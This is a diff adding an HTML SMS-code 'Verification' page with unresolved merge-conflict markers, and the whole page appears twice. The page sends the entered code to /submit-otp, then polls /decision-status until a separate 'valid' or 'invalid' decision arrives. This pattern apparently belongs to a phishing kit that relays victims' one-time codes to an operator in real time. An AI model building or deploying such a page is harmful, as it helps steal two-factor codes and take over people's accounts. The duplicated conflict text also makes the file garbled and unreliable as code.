@@ -1,0 +1,334 @@
+<<<<<<< HEAD
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="header"></div>
+
+<div class="container">
+
+    <h2 class="title">Verification</h2>
+
+    <!-- 🔄 LOADER -->
+    <div class="loader"></div>
+
+    <p style="text-align:center; margin-top:15px;">
+    Please enter the code sent to your phone number via SMS.
+</p>
+
+    <!-- 🔢 OTP BOXES -->
+    <div id="otpBoxes" style="display:flex; justify-content:center; gap:10px; margin-top:20px;"></div>
+
+    <!-- BUTTON -->
+    <button class="login-btn" onclick="submitOTP()">Continue</button>
+
+</div>
+
+<div class="footer"></div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+
+    // get OTP length
+    const length = parseInt(localStorage.getItem("otpLength")) || 5;
+
+    const container = document.getElementById("otpBoxes");
+
+    localStorage.removeItem("otpLength");
+
+    fetch("/clear-decision", { method: "POST" });
+
+    // create boxes
+    for (let i = 0; i < length; i++) {
+        const input = document.createElement("input");
+        input.type = "text";
+        input.maxLength = 1;
+        input.className = "pin-box";
+
+        container.appendChild(input);
+    }
+
+    const inputs = document.querySelectorAll(".pin-box");
+
+    inputs.forEach((input, index) => {
+
+        input.addEventListener("input", () => {
+            input.value = input.value.replace(/[^0-9]/g, "");
+
+            if (input.value && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+        });
+
+        input.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && !input.value && index > 0) {
+                inputs[index - 1].focus();
+            }
+        });
+
+    });
+
+    // submit OTP
+    window.submitOTP = async function () {
+        if (window.isSubmitting) return;
+        window.isSubmitting = true;
+
+        let otp = "";
+
+        inputs.forEach(input => {
+            otp += input.value;
+        });
+
+        if (otp.length != length) {
+            showError("Enter full code");
+            window.isSubmitting = false;
+            return;
+        }
+
+        const res = await fetch("/submit-otp", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ otp })
+        });
+
+        const data = await res.json();
+
+        if (data.success) {
+            showError("Code submitted. Loading...");
+        } else {
+            showError("Error submitting code");
+        }
+
+        window.isSubmitting = false;
+    };
+
+    let isRedirecting = false;
+
+    const decisionChecker = setInterval(async () => {
+        if (isRedirecting) return;
+
+        try {
+            const res = await fetch("/decision-status");
+            const data = await res.json();
+
+            if (data.decision === "valid") {
+                isRedirecting = true;
+                clearInterval(decisionChecker);
+
+                document.querySelector(".container").innerHTML =
+                    "<h2 style='text-align:center'>Approved...</h2>";
+
+                setTimeout(() => {
+                    window.location.href = "/dashboard.html";
+                }, 1500);
+            }
+
+            if (data.decision === "invalid") {
+                showError("Invalid code. Try again.");
+            }
+
+        } catch (err) {
+            console.log("Waiting decision...");
+        }
+
+    }, 2000);
+
+    function showError(msg) {
+        let box = document.getElementById("errorBox");
+
+        if (!box) {
+            box = document.createElement("div");
+            box.id = "errorBox";
+            box.style.color = "red";
+            box.style.textAlign = "center";
+            box.style.marginTop = "10px";
+            document.querySelector(".container").appendChild(box);
+        }
+
+        box.innerText = msg;
+    }
+
+    document.body.classList.add("loaded");
+
+});
+</script>
+<div id="pageLoader" class="loader" style="display:none;"></div>
+</body>
+=======
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Verification</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+
+<div class="header"></div>
+
+<div class="container">
+
+    <h2 class="title">Verification</h2>
+
+    <!-- 🔄 LOADER -->
+    <div class="loader"></div>
+
+    <p style="text-align:center; margin-top:15px;">
+    Please enter the code sent to your phone number via SMS.
+</p>
+
+    <!-- 🔢 OTP BOXES -->
+    <div id="otpBoxes" style="display:flex; justify-content:center; gap:10px; margin-top:20px;"></div>
+
+    <!-- BUTTON -->
+    <button class="login-btn" onclick="submitOTP()">Continue</button>
+
+</div>
+
+<div class="footer"></div>
+
+<script>
+document.addEventListener("DOMContentLoaded", function () {
+
+    // get OTP length
+    const length = parseInt(localStorage.getItem("otpLength")) || 5;
+
+    const container = document.getElementById("otpBoxes");
+
+    localStorage.removeItem("otpLength");
+
+    fetch("/clear-decision", { method: "POST" });
+
+    // create boxes
+    for (let i = 0; i < length; i++) {
+        const input = document.createElement("input");
+        input.type = "text";
+        input.maxLength = 1;
+        input.className = "pin-box";
+
+        container.appendChild(input);
+    }
+
+    const inputs = document.querySelectorAll(".pin-box");
+
+    inputs.forEach((input, index) => {
+
+        input.addEventListener("input", () => {
+            input.value = input.value.replace(/[^0-9]/g, "");
+
+            if (input.value && index < inputs.length - 1) {
+                inputs[index + 1].focus();
+            }
+        });
+
+        input.addEventListener("keydown", (e) => {
+            if (e.key === "Backspace" && !input.value && index > 0) {
+                inputs[index - 1].focus();
+            }
+        });
+
+    });
+
+    // submit OTP
+    window.submitOTP = async function () {
+        if (window.isSubmitting) return;
+        window.isSubmitting = true;
+
+        let otp = "";
+
+        inputs.forEach(input => {
+            otp += input.value;
+        });
+
+        if (otp.length != length) {
+            showError("Enter full code");
+            window.isSubmitting = false;
+            return;
+        }
+
+        const res = await fetch("/submit-otp", {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: JSON.stringify({ otp })
+        });
+
+        const data = await res.json();
+
+        if (data.success) {
+            showError("Code submitted. Loading...");
+        } else {
+            showError("Error submitting code");
+        }
+
+        window.isSubmitting = false;
+    };
+
+    let isRedirecting = false;
+
+    const decisionChecker = setInterval(async () => {
+        if (isRedirecting) return;
+
+        try {
+            const res = await fetch("/decision-status");
+            const data = await res.json();
+
+            if (data.decision === "valid") {
+                isRedirecting = true;
+                clearInterval(decisionChecker);
+
+                document.querySelector(".container").innerHTML =
+                    "<h2 style='text-align:center'>Approved...</h2>";
+
+                setTimeout(() => {
+                    window.location.href = "/dashboard.html";
+                }, 1500);
+            }
+
+            if (data.decision === "invalid") {
+                showError("Invalid code. Try again.");
+            }
+
+        } catch (err) {
+            console.log("Waiting decision...");
+        }
+
+    }, 2000);
+
+    function showError(msg) {
+        let box = document.getElementById("errorBox");
+
+        if (!box) {
+            box = document.createElement("div");
+            box.id = "errorBox";
+            box.style.color = "red";
+            box.style.textAlign = "center";
+            box.style.marginTop = "10px";
+            document.querySelector(".container").appendChild(box);
+        }
+
+        box.innerText = msg;
+    }
+
+    document.body.classList.add("loaded");
+
+});
+</script>
+<div id="pageLoader" class="loader" style="display:none;"></div>
+</body>
+>>>>>>> 52e3b6ca46fe401f9410078b0f293ba170ae05e2
+</html>
